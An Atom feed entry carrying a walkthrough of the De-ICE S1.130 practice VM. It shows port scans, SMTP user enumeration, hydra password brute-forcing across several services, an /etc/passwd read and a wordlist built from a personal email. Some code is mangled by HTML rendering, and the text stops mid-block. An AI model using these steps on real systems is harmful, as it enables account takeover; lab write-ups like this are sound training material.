<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: Deice | 0x73696e65]]></title>
  <link href="http://73696e65.github.io/blog/categories/deice/atom.xml" rel="self"/>
  <link href="http://73696e65.github.io/"/>
  <updated>2015-08-25T21:46:37+02:00</updated>
  <id>http://73696e65.github.io/</id>
  <author>
    <name><![CDATA[Norbert Szetei]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[DE-ICE-S1.130]]></title>
    <link href="http://73696e65.github.io/blog/2015/05/14/de-ice-s1-dot-130/"/>
    <updated>2015-05-14T15:34:52+02:00</updated>
    <id>http://73696e65.github.io/blog/2015/05/14/de-ice-s1-dot-130</id>
    <content type="html"><![CDATA[<p>Image: <a href="https://www.vulnhub.com/entry/de-ice-s1130,11/">De-ICE: S1.130</a></p>

<p>Nmap output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>PORT    STATE  SERVICE  VERSION
</span><span class='line'>20/tcp  closed ftp-data
</span><span class='line'>21/tcp  open   ftp      vsftpd 2.0.4
</span><span class='line'>22/tcp  open   ssh      OpenSSH 4.3 (protocol 1.99)
</span><span class='line'>25/tcp  open   smtp     Sendmail 8.13.7/8.13.7
</span><span class='line'>80/tcp  open   http     Apache httpd 2.0.55 ((Unix) PHP/5.1.2)
</span><span class='line'>110/tcp open   pop3     Openwall popa3d
</span><span class='line'>143/tcp open   imap     UW imapd 2004.357
</span><span class='line'>443/tcp closed https
</span><span class='line'>MAC Address: 00:0C:29:53:2F:A3 (VMware)</span></code></pre></td></tr></table></div></figure></p>

<p>Dirb output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&mdash;- Scanning URL: &lt;a href="http://192.168.1.20/">http://192.168.1.20/&lt;/a> &mdash;-
</span><span class='line'>+ &lt;a href="http://192.168.1.20/cgi-bin/">http://192.168.1.20/cgi-bin/&lt;/a> (CODE:403|SIZE:296)
</span><span class='line'>+ &lt;a href="http://192.168.1.20/index.php">http://192.168.1.20/index.php&lt;/a> (CODE:200|SIZE:1980)
</span><span class='line'>+ &lt;a href="http://192.168.1.20/index2.php">http://192.168.1.20/index2.php&lt;/a> (CODE:200|SIZE:563)
</span><span class='line'>+ &lt;a href="http://192.168.1.20/info.php">http://192.168.1.20/info.php&lt;/a> (CODE:200|SIZE:37915)
</span><span class='line'>+ &lt;a href="http://192.168.1.20/~sysadmin">http://192.168.1.20/~sysadmin&lt;/a> (CODE:403|SIZE:416)</span></code></pre></td></tr></table></div></figure></p>

<p>There is nothing interesting for us except the sysadmin account.</p>

<p>Web page mentions <a href="&#x6d;&#x61;&#x69;&#x6c;&#x74;&#x6f;&#58;&#99;&#117;&#115;&#116;&#x6f;&#x6d;&#x65;&#x72;&#x73;&#x65;&#114;&#118;&#x69;&#x63;&#x65;&#97;&#x64;&#x6d;&#105;&#110;&#x40;&#110;&#111;&#115;&#x65;&#99;&#98;&#x61;&#x6e;&#x6b;&#x2e;&#x63;&#x6f;&#x6d;">&#x63;&#x75;&#x73;&#116;&#111;&#109;&#x65;&#x72;&#115;&#101;&#114;&#x76;&#105;&#99;&#x65;&#97;&#100;&#109;&#x69;&#110;&#x40;&#110;&#111;&#x73;&#x65;&#x63;&#98;&#x61;&#110;&#107;&#46;&#99;&#x6f;&#x6d;</a> email address. After a
little trying, we found out the user account that exists:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# smtp-user-enum -M RCPT -t 192.168.1.20 -f &lt;a href="&#109;&#x61;&#x69;&#108;&#116;&#111;&#58;&#x72;&#x6f;&#x6f;&#x74;&#64;&#x73;&#x6c;&#x61;&#120;&#x2e;&#101;&#x78;&#97;&#x6d;&#112;&#x6c;&#x65;&#x2e;&#110;&#x65;&#116;">&#114;&#111;&#x6f;&#116;&#64;&#x73;&#108;&#97;&#x78;&#x2e;&#x65;&#120;&#97;&#109;&#x70;&#x6c;&#x65;&#46;&#110;&#x65;&#116;&lt;/a> -U -
</span><span class='line'>csadmin
</span><span class='line'>[CTRL+D]&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>Starting smtp-user-enum v1.2 ( &lt;a href="http://pentestmonkey.net/tools/smtp-user-enum">http://pentestmonkey.net/tools/smtp-user-enum&lt;/a> )&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;hr />
</span><span class='line'>
</span><span class='line'>&lt;h2>|                   Scan Information                       |&lt;/h2>
</span><span class='line'>
</span><span class='line'>&lt;p>Mode &hellip;&hellip;&hellip;&hellip;&hellip;&hellip;&hellip; RCPT
</span><span class='line'>Worker Processes &hellip;&hellip;&hellip; 5
</span><span class='line'>Usernames file &hellip;&hellip;&hellip;.. -
</span><span class='line'>Target count &hellip;&hellip;&hellip;&hellip;. 1
</span><span class='line'>Username count &hellip;&hellip;&hellip;.. 1
</span><span class='line'>Target TCP port &hellip;&hellip;&hellip;. 25
</span><span class='line'>Query timeout &hellip;&hellip;&hellip;&hellip; 5 secs
</span><span class='line'>Target domain &hellip;&hellip;&hellip;&hellip;&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;h6>## Scan started at Thu May  7 13:50:31 2015&lt;/h6>
</span><span class='line'>
</span><span class='line'>&lt;p>192.168.1.20: csadmin exists&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;h6>## Scan completed at Thu May  7 13:50:31 2015&lt;/h6>
</span><span class='line'>
</span><span class='line'>&lt;p>1 results.&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>1 queries in 2 seconds (0.5 queries / sec)</span></code></pre></td></tr></table></div></figure></p>

<p>We use hydra to crack user account successfully (ftp was the fastest way):
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# hydra -l csadmin 192.168.1.20 ftp -P /usr/share/ncrack/top50000.pwd -V
</span><span class='line'>[21][ftp] host: 192.168.1.20   login: csadmin   password: rocker&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>root@kali32:~# hydra -l csadmin 192.168.1.20 imap -P /usr/share/ncrack/top50000.pwd -V
</span><span class='line'>[143][imap] host: 192.168.1.20   login: csadmin   password: rocker&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>root@kali32:~# hydra -l csadmin 192.168.1.20 ssh -P /usr/share/ncrack/top50000.pwd -V -t 4
</span><span class='line'>[22][ssh] host: 192.168.1.20   login: csadmin   password: rocker&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>root@kali32:~# hydra -l csadmin 192.168.1.20 pop3 -P /usr/share/ncrack/top50000.pwd -V
</span><span class='line'>[110][pop3] host: 192.168.1.20   login: csadmin   password: rocker</span></code></pre></td></tr></table></div></figure></p>

<p>We log in as csadmin / rocker:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>csadmin@slax:~$ cat /etc/passwd
</span><span class='line'>root:x:0:0::/root:/bin/bash
</span><span class='line'>bin:x:1:1:bin:/bin:
</span><span class='line'>daemon:x:2:2:daemon:/sbin:
</span><span class='line'>adm:x:3:4:adm:/var/log:
</span><span class='line'>lp:x:4:7:lp:/var/spool/lpd:
</span><span class='line'>sync:x:5:0:sync:/sbin:/bin/sync
</span><span class='line'>shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
</span><span class='line'>halt:x:7:0:halt:/sbin:/sbin/halt
</span><span class='line'>mail:x:8:12:mail:/:
</span><span class='line'>&lt;a href="news:x:9:13:news:/usr/lib/news:">news:x:9:13:news:/usr/lib/news:&lt;/a>
</span><span class='line'>uucp:x:10:14:uucp:/var/spool/uucppublic:
</span><span class='line'>operator:x:11:0:operator:/root:/bin/bash
</span><span class='line'>games:x:12:100:games:/usr/games:
</span><span class='line'>&lt;a href="ftp:x:14:50::/home/ftp:">ftp:x:14:50::/home/ftp:&lt;/a>
</span><span class='line'>smmsp:x:25:25:smmsp:/var/spool/clientmqueue:
</span><span class='line'>mysql:x:27:27:MySQL:/var/lib/mysql:/bin/bash
</span><span class='line'>rpc:x:32:32:RPC portmap user:/:/bin/false
</span><span class='line'>sshd:x:33:33:sshd:/:
</span><span class='line'>gdm:x:42:42:GDM:/var/state/gdm:/bin/bash
</span><span class='line'>pop:x:90:90:POP:/:
</span><span class='line'>nobody:x:99:99:nobody:/:
</span><span class='line'>sysadmin:x:1000:10:,,,:/home/sysadmin:/bin/bash
</span><span class='line'>dbadmin:x:1001:100:,,,:/home/dbadmin:/bin/bash
</span><span class='line'>sdadmin:x:1002:100:,,,:/home/sdadmin:/bin/bash
</span><span class='line'>csadmin:x:1003:100:,,,:/home/csadmin:/bin/bash</span></code></pre></td></tr></table></div></figure></p>

<p>In home directory, there is a clue how to get sdadmin&rsquo;s password:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>csadmin@slax:~$ cat mailserv_download/2010122014234.j12Gqo4H049241
</span><span class='line'>To: &lt;a href="&#x6d;&#x61;&#x69;&#x6c;&#116;&#111;&#x3a;&#99;&#115;&#x61;&#100;&#109;&#105;&#x6e;&#64;&#x6e;&#x6f;&#x73;&#101;&#99;&#98;&#x61;&#110;&#x6b;&#46;&#99;&#111;&#109;">&#99;&#x73;&#97;&#x64;&#109;&#x69;&#110;&#x40;&#x6e;&#x6f;&#x73;&#x65;&#99;&#98;&#97;&#x6e;&#x6b;&#46;&#99;&#111;&#x6d;&lt;/a>
</span><span class='line'>CC:
</span><span class='line'>Subject: My Son&rsquo;s Birthday
</span><span class='line'>Date: Mon, 20 Dec 2010 14:23:46 +0500
</span><span class='line'>Return-Path: &lt;a href="&#x6d;&#x61;&#105;&#108;&#x74;&#x6f;&#58;&#x73;&#x64;&#97;&#x64;&#x6d;&#105;&#110;&#x40;&#x6e;&#x6f;&#115;&#101;&#99;&#98;&#97;&#x6e;&#107;&#46;&#99;&#x6f;&#109;">&#115;&#x64;&#97;&#x64;&#109;&#105;&#x6e;&#64;&#x6e;&#x6f;&#x73;&#101;&#x63;&#x62;&#x61;&#x6e;&#x6b;&#x2e;&#99;&#111;&#x6d;&lt;/a>
</span><span class='line'>Delivered-To: csadmin:&lt;a href="&#x6d;&#x61;&#x69;&#x6c;&#116;&#x6f;&#x3a;&#110;&#111;&#x73;&#101;&#99;&#x62;&#97;&#110;&#x6b;&#x2e;&#99;&#111;&#x6d;&#64;&#x6e;&#111;&#x73;&#101;&#99;&#98;&#x61;&#110;&#x6b;&#x2e;&#x63;&#111;&#109;">&#110;&#111;&#115;&#x65;&#99;&#98;&#x61;&#110;&#107;&#46;&#99;&#x6f;&#109;&#64;&#x6e;&#111;&#x73;&#x65;&#x63;&#x62;&#97;&#110;&#x6b;&#x2e;&#x63;&#111;&#109;&lt;/a>
</span><span class='line'>Received: (qmail 20281 invoked from network); 20 Dec 2010 09:23:46 -0000
</span><span class='line'>X-Received: from network (192.168.1.123) by mailserv1-3.us6.service.com;
</span><span class='line'>20 Dec 2010 09:23:46 -0000
</span><span class='line'>Received: from www.nosecbank.com (unknown [198.65.139.34]) by
</span><span class='line'>srv5.us6.service.com (Postfix) with ESMTP id D98402459DD for
</span><span class='line'>&lt;a href="&#109;&#x61;&#105;&#x6c;&#116;&#111;&#x3a;&#x63;&#115;&#x61;&#100;&#109;&#105;&#x6e;&#x40;&#x6e;&#x6f;&#x73;&#101;&#x63;&#98;&#97;&#x6e;&#x6b;&#46;&#x63;&#x6f;&#x6d;">&#99;&#x73;&#x61;&#x64;&#109;&#x69;&#110;&#64;&#x6e;&#x6f;&#115;&#x65;&#99;&#98;&#97;&#110;&#x6b;&#x2e;&#x63;&#111;&#109;&lt;/a>; Mon, 20 Dec 2010 09:23:46 +0000 (GMT)
</span><span class='line'>Message-Id: &lt;a href="&#109;&#97;&#105;&#108;&#x74;&#x6f;&#58;&#50;&#48;&#49;&#48;&#x31;&#x32;&#x32;&#48;&#x31;&#x34;&#50;&#51;&#52;&#46;&#106;&#x31;&#x32;&#71;&#x71;&#111;&#x34;&#x48;&#x30;&#x34;&#x39;&#x32;&#x34;&#x31;&#64;&#119;&#x77;&#119;&#x2e;&#x6e;&#111;&#115;&#x65;&#99;&#98;&#97;&#x6e;&#x6b;&#46;&#99;&#x6f;&#109;">&#x32;&#48;&#49;&#48;&#x31;&#x32;&#x32;&#48;&#49;&#52;&#x32;&#x33;&#x34;&#x2e;&#106;&#x31;&#x32;&#x47;&#113;&#x6f;&#x34;&#x48;&#x30;&#52;&#x39;&#x32;&#x34;&#49;&#x40;&#119;&#119;&#119;&#x2e;&#x6e;&#111;&#115;&#101;&#99;&#98;&#x61;&#110;&#x6b;&#46;&#99;&#111;&#109;&lt;/a>
</span><span class='line'>Mime-Version: 1.0
</span><span class='line'>Content-Type: multipart/alternative;
</span><span class='line'>boundary=&ldquo;&mdash;=_NextPart_000_0000_02F24S11.FEPQRE80&rdquo;
</span><span class='line'>X-Mailer: K-Mail; Build 1.0.5510
</span><span class='line'>Thread-Index: Qw2cWVmE3odZs3TqTTqFvS1e3lexms==
</span><span class='line'>Message: Hey Mark, I am curious if you would be free to come over and
</span><span class='line'>visit for my son Donovin&rsquo;s birthday tomorrow after work.  I would also
</span><span class='line'>appreciate if you brought Andy with you as well, because Donny
</span><span class='line'>really enjoyed playing with him last time he was over.  I know its short
</span><span class='line'>notice but he is turning 12 and it is special for both him and me. Let
</span><span class='line'>me know if this works. Thanks!  -Paul</span></code></pre></td></tr></table></div></figure></p>

<p>Also there is a secord part of some algorithm:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">csadmin</span><span class="err">@</span><span class="nl">slax</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">strings</span> <span class="n">mailserv_download</span><span class="o">/</span><span class="mf">2010122216451.f</span><span class="mi">81L</span><span class="n">tw4R010211</span><span class="p">.</span><span class="n">part2</span> <span class="o">|</span> <span class="n">egrep</span> <span class="o">-</span><span class="n">o</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;([</span><span class="mi">0</span><span class="o">-</span><span class="mi">9</span><span class="p">][</span><span class="mi">0</span><span class="o">-</span><span class="mi">9</span><span class="p">].</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="mi">24</span>      <span class="kt">int</span><span class="p">[]</span> <span class="n">backLoop</span><span class="p">(</span><span class="kt">int</span><span class="p">[]</span> <span class="n">input</span><span class="p">){</span>
</span><span class='line'><span class="mi">25</span>      <span class="kt">int</span> <span class="n">ref</span><span class="o">=</span><span class="n">input</span><span class="p">.</span><span class="n">length</span><span class="p">;</span>   <span class="n">w</span>
</span><span class='line'><span class="mi">26</span>      <span class="kt">int</span> <span class="n">a</span><span class="o">=</span><span class="n">input</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span> <span class="kt">int</span> <span class="n">b</span><span class="o">=</span><span class="n">input</span><span class="p">[</span><span class="n">ref</span><span class="o">-</span><span class="mi">1</span><span class="p">];</span>
</span><span class='line'><span class="mi">27</span>      <span class="kt">int</span> <span class="n">ch</span><span class="o">=</span><span class="p">(</span><span class="n">a</span><span class="o">+</span><span class="n">b</span><span class="p">)</span><span class="o">/</span><span class="mi">2</span><span class="p">;</span>
</span><span class='line'><span class="mi">28</span>      <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="n">i</span><span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">ref</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">){</span>
</span><span class='line'><span class="mi">29</span>      <span class="k">if</span><span class="p">(</span><span class="n">i</span><span class="o">%</span><span class="mi">2</span><span class="o">==</span><span class="mi">0</span><span class="p">)</span> <span class="n">input</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">=</span><span class="p">(</span><span class="n">input</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">%</span><span class="n">check</span><span class="p">)</span><span class="o">+</span><span class="p">(</span><span class="n">ref</span><span class="o">+</span><span class="n">i</span><span class="p">);</span> <span class="o">&lt;</span><span class="n">br</span><span class="o">/&gt;</span>
</span><span class='line'><span class="mi">30</span>      <span class="k">else</span> <span class="n">input</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">=</span><span class="p">(</span><span class="n">input</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">+</span><span class="n">ref</span><span class="o">+</span><span class="n">i</span><span class="p">);}</span>        <span class="p">.</span>
</span><span class='line'><span class="mi">31</span>      <span class="k">return</span> <span class="n">input</span><span class="p">;}</span><span class="o">&lt;</span><span class="n">br</span><span class="o">/&gt;</span>
</span><span class='line'><span class="mi">45</span>      <span class="kt">int</span><span class="p">[]</span> <span class="n">loopProcess</span><span class="p">(</span><span class="kt">int</span><span class="p">[]</span> <span class="n">input</span><span class="p">){</span>
</span><span class='line'><span class="mi">46</span>      <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="n">i</span><span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">input</span><span class="p">.</span><span class="n">length</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">){</span>
</span><span class='line'><span class="mi">47</span>      <span class="k">if</span><span class="p">(</span><span class="n">input</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">==</span><span class="mi">40</span><span class="o">||</span><span class="n">input</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">==</span><span class="mi">41</span><span class="p">)</span> <span class="n">input</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">+=</span><span class="n">input</span><span class="p">.</span><span class="n">length</span><span class="p">;</span><span class="o">&lt;</span><span class="n">br</span><span class="o">/&gt;</span>
</span><span class='line'><span class="mi">48</span>      <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="n">input</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">==</span><span class="mi">45</span><span class="p">)</span> <span class="n">input</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">+=</span><span class="mi">20</span><span class="o">+</span><span class="n">i</span><span class="p">;}</span><span class="o">&lt;</span><span class="n">br</span><span class="o">/&gt;</span>
</span><span class='line'><span class="mi">49</span>      <span class="k">return</span> <span class="n">input</span><span class="p">;}</span><span class="o">&lt;</span><span class="n">br</span><span class="o">/&gt;</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>Using this information, we was able to crack the password:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# for i in {1..2000}; do echo donovin$i; echo Donovin$i; echo &ldquo;$i"donovin; echo &rdquo;$i"Donovin; done > wl
</span><span class='line'>root@kali32:~# hydra -l sdadmin 192.168.1.20 ftp -P wl
</span><span class='line'>Hydra v8.1 &copy; 2014 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>Hydra (&lt;a href="http://www.thc.org/thc-hydra">http://www.thc.org/thc-hydra&lt;/a>) starting at 2015-05-08 06:12:57
</span><span class='line'>[DATA] max 16 tasks per 1 server, overall 64 tasks, 8000 login tries (l:1/p:8000), ~7 tries per task
</span><span class='line'>[DATA] attacking service ftp on port 21
</span><span class='line'>[21][ftp] host: 192.168.1.20   login: sdadmin   password: donovin1998
</span><span class='line'>1 of 1 target successfully completed, 1 valid password found
</span><span class='line'>Hydra (&lt;a href="http://www.thc.org/thc-hydra">http://www.thc.org/thc-hydra&lt;/a>) finished at 2015-05-08 06:13:01</span></code></pre></td></tr></table></div></figure></p>

<p>We log in as sdadmin / donovin1998 and repeat the process:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">sdadmin</span><span class="err">@</span><span class="nl">slax</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">cat</span> <span class="n">mailserv_download</span><span class="o">/</span><span class="mf">2010122216451.f</span><span class="mi">81L</span><span class="n">tw4R010211</span><span class="p">.</span><span class="n">part3</span> <span class="o">|</span> <span class="n">strings</span> <span class="o">|</span> <span class="n">egrep</span> <span class="o">-</span><span class="n">o</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;([</span><span class="mi">0</span><span class="o">-</span><span class="mi">9</span><span class="p">][</span><span class="mi">0</span><span class="o">-</span><span class="mi">9</span><span class="p">].</span><span class="o">&lt;</span><span class="n">em</span><span class="o">&gt;</span><span class="p">)</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="mi">32</span>      <span class="kt">int</span><span class="p">[]</span> <span class="n">loopBack</span><span class="p">(</span><span class="kt">int</span><span class="p">[]</span> <span class="n">input</span><span class="p">){</span>
</span><span class='line'><span class="mi">33</span>      <span class="kt">int</span> <span class="n">ref</span><span class="o">=</span><span class="n">input</span><span class="p">.</span><span class="n">length</span><span class="o">/</span><span class="mi">2</span><span class="p">;</span>
</span><span class='line'><span class="mi">34</span>      <span class="kt">int</span><span class="p">[]</span> <span class="n">encNew</span> <span class="o">=</span><span class="kt">int</span><span class="p">[</span><span class="n">input</span><span class="p">.</span><span class="n">length</span><span class="o">+</span><span class="n">ref</span><span class="p">];</span>
</span><span class='line'><span class="mi">35</span>      <span class="kt">int</span> <span class="n">ch</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
</span><span class='line'><span class="mi">36</span>      <span class="nf">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="p">(</span><span class="n">ref</span><span class="o">/</span><span class="mi">2</span><span class="p">);</span><span class="n">i</span><span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">input</span><span class="p">.</span><span class="n">length</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">){</span><span class="o">&lt;</span><span class="n">br</span><span class="o">/&gt;</span>
</span><span class='line'><span class="mi">37</span>      <span class="n">encNew</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">=</span><span class="n">input</span><span class="p">[</span><span class="n">ch</span><span class="p">];</span> <span class="n">ch</span><span class="o">++</span><span class="p">;}</span>
</span><span class='line'><span class="mi">38</span>      <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="n">i</span><span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">encNew</span><span class="p">.</span><span class="n">length</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">){</span>
</span><span class='line'><span class="mi">39</span>      <span class="k">if</span><span class="p">(</span><span class="n">encNew</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="o">=</span><span class="mi">33</span><span class="p">)</span> <span class="n">encNew</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">=</span><span class="mi">33</span><span class="o">+</span><span class="p">(</span><span class="o">++</span><span class="n">ref</span><span class="o">&lt;/</span><span class="n">em</span><span class="o">&gt;</span><span class="mi">2</span><span class="p">);</span>
</span><span class='line'><span class="mi">40</span>      <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="n">encNew</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">&gt;=</span><span class="mi">126</span><span class="p">)</span> <span class="n">encNew</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">=</span><span class="mi">126</span><span class="o">-</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ndash</span><span class="p">;</span><span class="n">ref</span><span class="o">*</span><span class="mi">2</span><span class="p">);</span>
</span><span class='line'><span class="mi">41</span>      <span class="k">else</span><span class="p">{</span> <span class="o">&lt;</span><span class="n">br</span><span class="o">/&gt;</span>
</span><span class='line'><span class="mi">42</span>      <span class="k">if</span><span class="p">(</span><span class="n">i</span><span class="o">%</span><span class="mi">2</span><span class="o">==</span><span class="mi">0</span><span class="p">)</span> <span class="n">encNew</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">-=</span><span class="p">(</span><span class="n">i</span><span class="o">%</span><span class="mi">3</span><span class="p">);</span>
</span><span class='line'><span class="mi">43</span>      <span class="k">else</span> <span class="n">encNew</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">+=</span><span class="p">(</span><span class="n">i</span><span class="o">%</span><span class="mi">2</span><span class="p">);}}</span>
</span><span class='line'><span class="mi">44</span>      <span class="k">return</span> <span class="n">encNew</span><span class="p">;}</span> <span class="n">I</span>
</span></code></pre></td></tr></table></div></figure></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
